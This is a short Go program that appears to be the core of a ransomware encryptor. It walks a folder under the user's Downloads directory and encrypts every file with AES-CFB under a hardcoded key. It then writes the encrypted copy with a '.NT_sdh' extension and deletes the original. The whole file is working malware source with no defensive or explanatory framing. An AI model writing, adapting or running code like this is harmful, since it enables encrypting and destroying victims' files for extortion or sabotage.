package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

func main() {
	key := [32]byte{174, 76, 83, 109, 164, 175, 162, 120, 19, 152, 172, 207, 133, 183, 184, 30, 250, 5, 116, 121, 196, 111, 53, 21, 177, 194, 20, 37, 246, 118, 44, 235}

	usr, _ := user.Current()
	downloads := filepath.Join(usr.HomeDir, "Downloads/target")
	foldersPath := []string{downloads}

	for _, folderPath := range foldersPath {
		files, _ := os.ReadDir(folderPath)
		for _, file := range files {
			filePath := filepath.Join(folderPath, file.Name())
			if !strings.HasSuffix(file.Name(), ".NT_sdh") {
				plaintext, _ := os.ReadFile(filePath)
				if len(key) != 16 && len(key) != 24 && len(key) != 32 {
					fmt.Println("err")
					return
				}

				block, _ := aes.NewCipher(key[:])
				cipherText := make([]byte, aes.BlockSize+len(plaintext))
				iv := cipherText[:aes.BlockSize]
				if _, err := io.ReadFull(rand.Reader, iv); err != nil {
					fmt.Println(err)
				}

				stream := cipher.NewCFBEncrypter(block, iv)
				stream.XORKeyStream(cipherText[aes.BlockSize:], plaintext)

				destPath := filepath.Join(folderPath, file.Name()+".NT_sdh")
				err := os.WriteFile(destPath, cipherText, 0644)
				if err != nil {
					fmt.Println(err)
				}

				os.Remove(filePath)
			}
		}
	}
}
